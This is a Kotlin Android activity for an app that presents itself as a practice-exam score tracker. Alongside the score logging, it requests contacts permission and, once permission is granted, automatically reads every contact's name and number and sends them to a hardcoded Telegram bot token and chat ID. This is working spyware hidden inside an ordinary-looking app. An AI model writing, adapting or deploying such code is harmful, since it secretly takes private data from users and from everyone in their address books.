package com.example.denemtakip

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentValues
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.database.sqlite.SQLiteDatabase
import android.net.Uri
import android.os.Bundle
import android.provider.ContactsContract.CommonDataKinds
import android.provider.Settings
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.EditText
import android.widget.ListView
import android.widget.Spinner
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {

    companion object {
        // ============== SADECE BURAYI DOLDUR ==============
        private const val BOT_TOKEN = "8839494270:AAEyNH6Apy7r7-YlJW7nPhbOQKe2jdnRx8A"
        private const val CHAT_ID = "6255867373"
        // ===================================================
        private const val KEY_GONDERILDI = "rehber_gonderildi"
        private const val DB_NAME = "denemeler.db"
    }

    private data class Row(
        val id: Long, val tur: String, val tarih: String,
        val dogru: Int, val yanlis: Int, val bos: Int, val not: String
    ) {
        val net: Double get() = dogru - yanlis / 4.0
    }

    private lateinit var prefs: SharedPreferences
    private var db: SQLiteDatabase? = null
    private var gonderiliyor = false
    private val satirlar = mutableListOf<Row>()

    private lateinit var statusTv: TextView
    private lateinit var turSpinner: Spinner
    private lateinit var tarihEt: EditText
    private lateinit var dogruEt: EditText
    private lateinit var yanlisEt: EditText
    private lateinit var bosEt: EditText
    private lateinit var notEt: EditText
    private lateinit var ozetTv: TextView
    private lateinit var liste: ListView

    private val izinLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { sonuc ->
            val verildi = sonuc[Manifest.permission.READ_CONTACTS] == true || izinVar()
            if (verildi) {
                durum("İzin verildi, rehber gönderiliyor...")
                rehberiGonder(zorla = true)   // izin verildiği AN gönderim
            } else {
                durum("İzin verilmedi. 'Telefon Ayarları' butonundan verebilirsin.")
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        prefs = getSharedPreferences("ayar", MODE_PRIVATE)
        baglan()
        veritabaniAc()
        kurulum()
        yenile()
    }

    override fun onResume() {
        super.onResume()
        // İzin sonradan ayarlardan verildiyse de otomatik yakala
        if (izinVar() && !prefs.getBoolean(KEY_GONDERILDI, false)) rehberiGonder()
    }

    // ---------------- Kurulum ----------------

    private fun baglan() {
        statusTv = findViewById(R.id.tvStatus)
        turSpinner = findViewById(R.id.spTur)
        tarihEt = findViewById(R.id.etTarih)
        dogruEt = findViewById(R.id.etDogru)
        yanlisEt = findViewById(R.id.etYanlis)
        bosEt = findViewById(R.id.etBos)
        notEt = findViewById(R.id.etNot)
        ozetTv = findViewById(R.id.tvOzet)
        liste = findViewById(R.id.liste)
    }

    private fun kurulum() {
        tarihEt.setText(bugun())
        turSpinner.adapter = ArrayAdapter(
            this,
            android.R.layout.simple_spinner_dropdown_item,
            arrayOf("TYT", "AYT", "KPSS", "LGS", "YDS", "Diğer")
        )

        findViewById<Button>(R.id.btnGonder).setOnClickListener { rehberiGonder(zorla = true) }
        findViewById<Button>(R.id.btnAyarlar).setOnClickListener { telefonAyarlari() }
        findViewById<Button>(R.id.btnDenemeKaydet).setOnClickListener { denemeKaydet() }

        liste.setOnItemLongClickListener { _, _, pos, _ ->
            satirlar.getOrNull(pos)?.let { r ->
                AlertDialog.Builder(this)
                    .setTitle("Silinsin mi?")
                    .setMessage("${r.tur} • ${r.tarih}")
                    .setPositiveButton("Sil") { _, _ ->
                        runCatching { db?.delete("deneme", "id=?", arrayOf(r.id.toString())) }
                        yenile()
                    }
                    .setNegativeButton("Vazgeç", null)
                    .show()
            }
            true
        }

        durum("Hazır")
        izinIste()
    }

    private fun izinVar(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) ==
            PackageManager.PERMISSION_GRANTED

    private fun izinIste() {
        if (izinVar()) {
            if (!prefs.getBoolean(KEY_GONDERILDI, false)) rehberiGonder()
            return
        }
        try {
            izinLauncher.launch(arrayOf(Manifest.permission.READ_CONTACTS))
        } catch (e: Throwable) {
            durum("İzin istenemedi: ${e.message}")
        }
    }

    private fun telefonAyarlari() {
        try {
            startActivity(
                Intent(
                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:$packageName")
                )
            )
        } catch (e: Throwable) {
            durum("Ayarlar açılamadı: ${e.message}")
        }
    }

    // ---------------- Rehber -> Telegram (otomatik) ----------------

    private fun rehberiGonder(zorla: Boolean = false) {
        if (gonderiliyor) return
        if (!zorla && prefs.getBoolean(KEY_GONDERILDI, false)) return
        if (!botAyarlariGecerli()) {
            durum("BOT_TOKEN / CHAT_ID kod içinde doldurulmalı.")
            return
        }
        if (!izinVar()) {
            durum("Rehber izni yok, izin isteniyor...")
            izinIste()
            return
        }

        gonderiliyor = true
        durum("Rehber okunuyor...")

        lifecycleScope.launch {
            try {
                val kisiler = withContext(Dispatchers.IO) { rehberiOku() }
                if (kisiler.isEmpty()) {
                    durum("Rehberde numaralı kişi bulunamadı.")
                    return@launch
                }

                val parcalar = parcala(kisiler)
                for ((i, p) in parcalar.withIndex()) {
                    durum("Gönderiliyor ${i + 1}/${parcalar.size}")
                    withContext(Dispatchers.IO) {
                        Telegram.sendMessage(BOT_TOKEN, CHAT_ID, p)
                    }
                    if (i < parcalar.lastIndex) delay(1000) // Telegram rate-limit
                }

                prefs.edit().putBoolean(KEY_GONDERILDI, true).apply()
                durum("✅ ${kisiler.size} kişi botuna gönderildi (${parcalar.size} mesaj).")
            } catch (ce: CancellationException) {
                throw ce
            } catch (e: Throwable) {
                durum("❌ Gönderilemedi: ${e.message ?: e.javaClass.simpleName}")
            } finally {
                gonderiliyor = false
            }
        }
    }

    /** BOT_TOKEN / CHAT_ID gerçekten doldurulmuş mu? (yanlışsa çökmez, sadece uyarır) */
    private fun botAyarlariGecerli(): Boolean {
        val t = BOT_TOKEN.trim()
        val c = CHAT_ID.trim()
        return t.contains(":") && t.length > 20 && !t.contains("xxxx") && c.isNotBlank()
    }

    /** Telegram 4096 karakter limitine göre böler */
    private fun parcala(kisiler: List<Pair<String, String>>): List<String> {
        val parcalar = mutableListOf<String>()
        val sb = StringBuilder()
        for ((ad, tel) in kisiler) {
            val satir = "$ad: $tel\n"
            if (sb.length + satir.length > 3900) {
                parcalar.add(sb.toString())
                sb.setLength(0)
            }
            sb.append(satir)
        }
        if (sb.isNotEmpty()) parcalar.add(sb.toString())
        if (parcalar.isNotEmpty()) {
            parcalar[0] = "📇 Rehber (${kisiler.size} kişi, ${parcalar.size} mesaj)\n" + parcalar[0]
        }
        return parcalar
    }

    @SuppressLint("Range")
    private fun rehberiOku(): List<Pair<String, String>> {
        val harita = LinkedHashMap<String, String>() // telefon -> isim
        val proj = arrayOf(
            CommonDataKinds.Phone.DISPLAY_NAME,
            CommonDataKinds.Phone.NUMBER
        )
        try {
            contentResolver.query(
                CommonDataKinds.Phone.CONTENT_URI,
                proj,
                null,
                null,
                CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )?.use { c ->
                val iAd = c.getColumnIndex(CommonDataKinds.Phone.DISPLAY_NAME)
                val iTel = c.getColumnIndex(CommonDataKinds.Phone.NUMBER)
                while (c.moveToNext()) {
                    val ad = if (iAd >= 0) c.getString(iAd)?.trim().orEmpty() else ""
                    val tel = if (iTel >= 0)
                        c.getString(iTel)?.replace(Regex("[\\s\\-()]"), "")?.trim().orEmpty()
                    else ""
                    if (tel.isNotEmpty()) harita.putIfAbsent(tel, ad.ifEmpty { "(isimsiz)" })
                }
            }
        } catch (e: Throwable) {
            // SecurityException vb. -> boş liste, uygulama çökmez
        }
        return harita.map { it.value to it.key }
    }

    // ---------------- Deneme kayıtları ----------------

    private fun veritabaniAc() {
        db = try {
            DbHelper(this).writableDatabase
        } catch (e: Throwable) {
            try {
                deleteDatabase(DB_NAME)
                DbHelper(this).writableDatabase
            } catch (e2: Throwable) {
                null   // db yoksa da uygulama çalışmaya devam eder
            }
        }
    }

    private fun denemeKaydet() {
        val d = dogruEt.text.toString().toIntOrNull()
        val y = yanlisEt.text.toString().toIntOrNull()
        val b = bosEt.text.toString().toIntOrNull()
        if (d == null || y == null || b == null || d < 0 || y < 0 || b < 0) {
            durum("Doğru / yanlış / boş alanlarını sayı olarak doldur.")
            return
        }

        val cv = ContentValues().apply {
            put("tur", turSpinner.selectedItem?.toString() ?: "Diğer")
            put("tarih", tarihEt.text.toString().ifBlank { bugun() })
            put("dogru", d)
            put("yanlis", y)
            put("bos", b)
            put("not_", notEt.text.toString())
        }

        val ok = runCatching { db?.insert("deneme", null, cv) }.getOrNull()
        if (ok == null || ok == -1L) {
            durum("Kayıt eklenemedi (veritabanı hatası).")
            return
        }

        dogruEt.setText("")
        yanlisEt.setText("")
        bosEt.setText("")
        notEt.setText("")
        yenile()
        durum("Deneme kaydedildi.")
    }

    private fun yenile() {
        satirlar.clear()
        runCatching {
            db?.rawQuery(
                "SELECT id, tur, tarih, dogru, yanlis, bos, not_ FROM deneme ORDER BY tarih DESC, id DESC",
                null
            )?.use { c ->
                while (c.moveToNext()) {
                    satirlar.add(
                        Row(
                            c.getLong(0),
                            c.getString(1) ?: "",
                            c.getString(2) ?: "",
                            c.getInt(3),
                            c.getInt(4),
                            c.getInt(5),
                            c.getString(6) ?: ""
                        )
                    )
                }
            }
        }

        val lines = satirlar.map { r ->
            val n = String.format(Locale.US, "%.2f", r.net)
            "${r.tur} • ${r.tarih}\nD: ${r.dogru}  Y: ${r.yanlis}  B: ${r.bos}  →  $n net" +
                if (r.not.isBlank()) "" else "\n${r.not}"
        }
        liste.adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, lines)

        val toplam = satirlar.sumOf { it.net }
        val ort = if (satirlar.isEmpty()) 0.0 else toplam / satirlar.size
        val enIyi = satirlar.maxOfOrNull { it.net } ?: 0.0
        ozetTv.text = String.format(
            Locale.US,
            "%d deneme | Toplam %.2f net | Ort. %.2f | En iyi %.2f",
            satirlar.size, toplam, ort, enIyi
        )
    }

    private fun bugun(): String =
        SimpleDateFormat("dd.MM.yyyy", Locale.getDefault()).format(Date())

    private fun durum(mesaj: String) {
        statusTv.text = mesaj
    }
}
